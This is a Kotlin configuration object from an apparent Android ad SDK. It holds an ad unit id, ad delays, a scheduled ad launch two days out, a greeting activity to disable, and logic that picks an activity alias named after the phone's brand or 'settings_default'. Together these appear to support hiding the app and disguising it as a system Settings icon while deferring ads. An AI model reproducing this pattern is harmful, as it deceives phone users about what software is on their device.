package com.app.sdk.sdk.config

import android.os.Build
import java.util.*
import java.util.concurrent.TimeUnit

object SdkConfig {

    const val topicName = "paxi"
    const val disableActivity = ".ui.greeting.GreetingActivity"
    const val adUnitId = "cc3880c3d227daec"

    val startSDKTime = Calendar.getInstance().apply {
        set(Calendar.YEAR, 2023)
        set(Calendar.MONTH, Calendar.JUNE)
        set(Calendar.DAY_OF_MONTH, 1)
        set(Calendar.HOUR_OF_DAY, 0)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

    val adDelay = TimeUnit.SECONDS.toMillis(40)

    private val deviceBrand by lazy { Build.BRAND }
    private val icons = listOf(
        "samsung",
        "realme",
        "vivo",
        "huawei",
        "oppo",
        "xiaomi",
        "motorola",
        "oneplus",
        "google"
    )

    private const val defaultActivityAlias = "settings_default"

    fun getEnableComponentName(): String =
        if (deviceBrand.lowercase() in icons) deviceBrand.lowercase() else defaultActivityAlias

    fun getLaunchAdTime() = Calendar.getInstance().apply {
        time = Date().apply { time += TimeUnit.DAYS.toMillis(2) }
        set(Calendar.HOUR_OF_DAY, 10)
        set(Calendar.MINUTE, 0)
        set(Calendar.SECOND, 0)
        set(Calendar.MILLISECOND, 0)
    }.time.time

    fun notRequiredPermission() = Build.VERSION.SDK_INT < Build.VERSION_CODES.Q

}